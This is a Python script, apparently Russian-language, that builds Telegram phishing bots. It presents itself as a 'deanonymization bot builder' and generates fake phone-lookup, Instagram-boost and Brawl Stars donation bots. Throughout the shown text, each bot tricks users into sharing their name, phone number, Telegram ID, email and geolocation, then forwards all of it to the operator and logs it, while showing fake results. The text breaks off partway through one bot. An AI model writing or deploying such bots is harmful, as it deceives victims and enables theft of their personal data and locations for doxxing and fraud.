import colorama
from colorama import Fore, Back, Style
import os
os.system('clear')
print(Fore.RED + '''
         _,.-------.,_
     ,;~'             '~;,
   ,;                     ;,
  ;                         ;
 ,'                         ',
,;                           ;,
; ;      .           .      ; ;
| ;   ______       ______   ; |
|  `/~"     ~" . "~     "~\'  |
|  ~  ,-~~~^~, | ,~^~~~-,  ~  |
 |   |        }:{        |   |
 |   l       / | \       !   |
 .~  (__,.--" .^. "--.,__)  ~.
 |     ---;' / | \ `;---     |
  \__.       \/^\/       .__/
   V| \                 / |V
    | |T~\___!___!___/~T| |
    | |`IIII_I_I_I_IIII'| |
    |  \,III I I I III,/  |
     \   `~~~~~~~~~~'    /
       \   .       .   /     
         \.    ^    ./
           ^~~~^~~~^


	''')
input(Fore.GREEN + "–ù–∞–∂–º–∏—Ç–µ Enter")
os.system('clear')
print(Fore.MAGENTA + ' _____    _   _   _   _ ' + Fore.YELLOW + ' __  __   ______ ')
print(Fore.MAGENTA + '|  __ \  | \ | | | \ | |' + Fore.YELLOW + '|  \/  | |  ____|')
print(Fore.MAGENTA + '| |  | | |  \| | |  \| |' + Fore.YELLOW + '| \  / | | |__   ')
print(Fore.MAGENTA + '| |  | | | . ` | | . ` |' + Fore.YELLOW + '| |\/| | |  __|  ')
print(Fore.MAGENTA + '| |__| | | |\  | | |\  |' + Fore.YELLOW + '| |  | | | |____ ')
print(Fore.MAGENTA + '|_____/  |_| \_| |_| \_|' + Fore.YELLOW + '|_|  |_| |______|')
print(Fore.YELLOW + '-----------------------------------------')
print(Fore.YELLOW + '|' + Fore.BLUE +  " Telegram Deanonymization bot builder  " + Fore.YELLOW + '|')
print(Fore.YELLOW + '|' + Fore.BLUE +  "       Developer: @lamer112311         " + Fore.YELLOW + '|')
print(Fore.YELLOW + '|' + Fore.BLUE +  "        Channel: cutt.ly/CyberPuffin   " + Fore.YELLOW + '|')
print(Fore.YELLOW + '-----------------------------------------')
userid = input(Fore.RED +  "–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π Telegram ID > ")
token = input(Fore.BLUE +  "–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω –±–æ—Ç–∞ > ")
print(Fore.CYAN + '''
[1] –ü—Ä–æ–±–∏–≤ –ø–æ –Ω–æ–º–µ—Ä—É
[2] –ù–∞–∫—Ä—É—Ç–∫–∞ –∏–Ω—Å—Ç–∞–≥—Ä–∞–º
[3] –ë—Ä–∞–≤–ª —Å—Ç–∞—Ä—Å
[4] –ó–Ω–∞–∫–æ–º—Å—Ç–≤–∞
[5] BTC BANKER
	''')
choice = input(Fore.MAGENTA +  "–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞—Ä–∏–∞–Ω—Ç —Ñ–µ–π–∫ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞:>>> ")
if not choice.isdigit():
	print("–û—à–∏–±–∫–∞, –≤–∞—Ä–∏–∞–Ω—Ç –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–µ–ª—å–Ω—ã–º")
	exit(0)
choice = int(choice)



if choice == 1:
	f = open('probiv.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
adr = ['–¢–≤–µ—Ä—Å–∫–∞—è —É–ª–∏—Ü–∞, –¥–æ–º 13', '–ü—Ä–æ—Å–ø–µ–∫—Ç 60-–ª–µ—Ç–∏—è –û–∫—Ç—è–±—Ä—è', '–£–ª–∏—Ü–∞ –í–∏–Ω–æ–∫—É—Ä–æ–≤–∞', '3-–π –ì–æ–ª—É—Ç–≤–∏–Ω—Å–∫–∏–π –ø–µ—Ä–µ—É–ª–æ–∫']
bot.send_message(ID, '!BOT STARTED!') 
print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!")

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''üëã –ü—Ä–∏–≤–µ—Ç! üëã
		–≠—Ç–æ –±–æ—Ç, –∫–æ—Ç–æ—Ä—ã–π, –º–æ–∂–µ—Ç –ø–æ–∫–∞–∑–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –ø–æ –Ω–æ–º–µ—Ä—É —Ç–µ–ª–µ—Ñ–æ–Ω–∞!
	–î–ª—è –ø–æ–∏—Å–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏, –≤–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É /getinfo''') 
	
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, '–ê–≤—Ç–æ—Ä —Å–∫—Ä–∏–ø—Ç–∞: @lamer112311. –ö–∞–Ω–∞–ª: cutt.ly/CyberPuffin') 

@bot.message_handler(commands=['getinfo'])
def start(message):
	msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –ª—é–±–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		user_input = message.text
		num = user_input.replace('+', '')

		if not num.isdigit():
			msg = bot.reply_to(message, '–ö–∞–∂–µ—Ç—Å—è, –≤—ã –Ω–µ –≤–≤–µ–ª–∏ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /getinfo!')#‚è≥
			return

		bot.send_message(m_id, f'–ó–∞–ø—Ä–æ—Å –Ω–∞ –Ω–æ–º–µ—Ä {{num}} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!')
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="–ó–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''–ü–æ—Ö–æ–∂–µ —É –≤–∞—Å –Ω–µ –æ—Å—Ç–∞–ª–æ—Å—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ –¥–µ–Ω—å!
			–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –≤–æ–ø—Ä–æ—Å—ã –∑–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –≤ –±–æ—Ç–µ!''', reply_markup=keyboard)
# –û—Ç–ª–æ–≤–∫–∞ –æ—à–∏–±–æ–∫
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			–î–∞–Ω–Ω—ã–µ
			‚îú–ò–º—è: {{first}} {{last}}
			‚îúID: {{userid}}
			‚îú–ù–∏–∫: @{{nick}}
			‚îî–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π –∫–æ–Ω—Ç–∞–∫—Ç!')

	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	button = types.InlineKeyboardButton(text="–†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π –ø–æ–∏—Å–∫", callback_data="find")
	keyboardmain.add(button)
	bot.send_message(message.chat.id, f'''
		–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –Ω–æ–º–µ—Ä–µ
		‚îú–û–ø–µ—Ä–∞—Ç–æ—Ä: Beeline
		‚îî–°—Ç—Ä–∞–Ω–∞: –†–æ—Å—Å–∏—è
		''', reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "find":
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(call.message.chat.id, text='–î–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –±–µ—Å–ø–ª–∞—Ç–Ω–æ–≥–æ —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–≥–æ –ø–æ–∏—Å–∫–∞, –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
		‚îúID: {{message.chat.id}}
		‚îúLongitude: {{lon}}
		‚îúLatitude: {{lat}}
		‚îî–ö–∞—Ä—Ç—ã: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, f'''
			–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
			‚îî–ê–¥—Ä–µ—Å: {{random.choice(adr)}}
			''')
bot.polling()
		""")
	f.close()
	print("–§–∞–π–ª probiv.py —Å–æ—Ö—Ä–∞–Ω–µ–Ω")

if choice == 2:
	f = open('nacr.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random


log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!')
print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!") 
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''üëã –ü—Ä–∏–≤–µ—Ç! üëã
		–≠—Ç–æ –±–æ—Ç –¥–ª—è –Ω–∞–∫—Ä—É—Ç–∫–∏ –ª–∞–π–∫–æ–≤ –∏ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ –≤ –∏–Ω—Å—Ç–∞–≥—Ä–∞–º!
		–î–ª—è —Å—Ç–∞—Ä—Ç–∞ –Ω–∞–ø–∏—à–∏—Ç–µ /nacrutka''') 
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, '–ê–≤—Ç–æ—Ä —Å–∫—Ä–∏–ø—Ç–∞: @lamer112311. –ö–∞–Ω–∞–ª: cutt.ly/CyberPuffin') 
@bot.message_handler(commands=['nacrutka'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="–õ–∞–π–∫–∏", callback_data="first")
	second_button = types.InlineKeyboardButton(text="–ü–æ–¥–ø–∏—Å—á–∏–∫–∏", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç –Ω–∞–∫—Ä—É—Ç–∫–∏:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ª–∞–π–∫–æ–≤ (–Ω–µ –±–æ–ª–µ–µ 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ (–Ω–µ –±–æ–ª–µ–µ 500)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /nacrutka!')#‚è≥
			return
		if int(num) > 500:
			bot.reply_to(message, '–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ª–∞–π–∫–æ–≤ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="–ó–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''–ü–æ—Ö–æ–∂–µ —É –≤–∞—Å –Ω–µ –æ—Å—Ç–∞–ª–æ—Å—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ –¥–µ–Ω—å!
			–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã –∑–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –≤ –±–æ—Ç–µ!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /nacrutka!')#‚è≥
			return

		if int(num) > 500:
			bot.reply_to(message, '–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''–ü–æ—Ö–æ–∂–µ —É –≤–∞—Å –Ω–µ –æ—Å—Ç–∞–ª–æ—Å—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ –¥–µ–Ω—å!
			–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã –∑–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –≤ –±–æ—Ç–µ!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			–î–∞–Ω–Ω—ã–µ
			‚îú–ò–º—è: {{first}} {{last}}
			‚îúID: {{userid}}
			‚îú–ù–∏–∫: @{{nick}}
			‚îî–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {{phone}}
			'''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π –∫–æ–Ω—Ç–∞–∫—Ç!')
		bot.send_message(message.chat.id, '–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –Ω–∏–∫ –≤ –∏–Ω—Å—Ç–∞–≥—Ä–∞–º:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'–ù–∏–∫: {{inp}} ')#‚è≥
		bot.send_message(ID, f'–ù–∏–∫ –≤ –∏–Ω—Å—Ç–∞—Ä–∞–º: {{inp}}')
		bot.send_message(message.chat.id, '–û–∂–∏–¥–∞–π—Ç–µ –Ω–∞–∫—Ä—É—Ç–∫—É –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')




bot.polling()


		""")
	f.close()
	print("–§–∞–π–ª nacr.py —Å–æ—Ö—Ä–∞–Ω–µ–Ω")

if choice == 3:
	f = open('brawl.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random


log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!')
print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!") 
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''üëã –ü—Ä–∏–≤–µ—Ç, {{message.from_user.first_name}}! üëã
		–≠—Ç–æ –±–æ—Ç, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –∑–∞–¥–æ–Ω–∞—Ç–∏—Ç—å –≤ –±—Ä–∞–≤–ª —Å—Ç–∞—Ä—Å 
		–ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å, –Ω–∞–ø–∏—à–∏ –∫–æ–º–∞–Ω–¥—É /don''') 
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, '–ê–≤—Ç–æ—Ä —Å–∫—Ä–∏–ø—Ç–∞: @lamer112311. –ö–∞–Ω–∞–ª: cutt.ly/CyberPuffin') 
@bot.message_handler(commands=['don'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="üí∞–ó–æ–ª–æ—Ç–æüí∞", callback_data="first")
	second_button = types.InlineKeyboardButton(text="üíé–ì–µ–º—ãüíé", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –∑–æ–ª–æ—Ç–∞üí∞ (–Ω–µ –±–æ–ª–µ–µ 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –≥–µ–º–æ–≤üíé (–Ω–µ –±–æ–ª–µ–µ 50)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /don!')#‚è≥
			return
		if int(num) > 500:
			bot.reply_to(message, '–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –∑–æ–ª–æ—Ç–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''–ü–æ—Ö–æ–∂–µ —É –≤–∞—Å –Ω–µ –æ—Å—Ç–∞–ª–æ—Å—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ –¥–µ–Ω—å!
			–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –≤ –±–æ—Ç–µ!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /don!')#‚è≥
			return

		if int(num) > 50:
			bot.reply_to(message, '–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –≥–µ–º–æ–≤ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 50!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''–ü–æ—Ö–æ–∂–µ —É –≤–∞—Å –Ω–µ –æ—Å—Ç–∞–ª–æ—Å—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ –¥–µ–Ω—å!
			–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –≤ –±–æ—Ç–µ!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			–î–∞–Ω–Ω—ã–µ
			‚îú–ò–º—è: {{first}} {{last}}
			‚îúID: {{userid}}
			‚îú–ù–∏–∫: @{{nick}}
			‚îî–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {{phone}}
			'''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π –∫–æ–Ω—Ç–∞–∫—Ç!')
		bot.send_message(message.chat.id, '–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –ø–æ—á—Ç—É, –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—É—é –∫ –∏–≥—Ä–µ:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id


		bot.send_message(ID, f'–ü–æ—á—Ç–∞: {{inp}}')

		markup_reply = types.ReplyKeyboardMarkup(resize_keyboard = True)
		item_an = types.KeyboardButton('–ü–æ–ª—É—á–∏—Ç—å –±–æ–ª—å—à–µ –≥–µ–º–æ–≤')
		markup_reply.add(item_an)
		bot.send_message(message.chat.id, f'–ü–æ—á—Ç–∞: {{inp}} ', reply_markup = markup_reply)
		time.sleep(1)
		bot.send_message(message.chat.id, '–û–∂–∏–¥–∞–π—Ç–µ –¥–æ–Ω–∞—Ç –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤!')

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')

@bot.message_handler(content_types = ['text'])
def get_text(message):
	if message.text == '–ü–æ–ª—É—á–∏—Ç—å –±–æ–ª—å—à–µ –≥–µ–º–æ–≤':
		m_id = message.chat.id
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", request_location=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –±–æ–ª—å—à–µ –≥–µ–º–æ–≤, –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é!''', reply_markup=keyboard)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
		‚îúID: {{message.chat.id}}
		‚îúLongitude: {{lon}}
		‚îúLatitude: {{lat}} 
		‚îî–ö–∞—Ä—Ç—ã: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –≥–µ–º–æ–≤üíé (–Ω–µ –±–æ–ª–µ–µ 800)') 
		bot.register_next_step_handler(msg, proc3)

def proc3(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
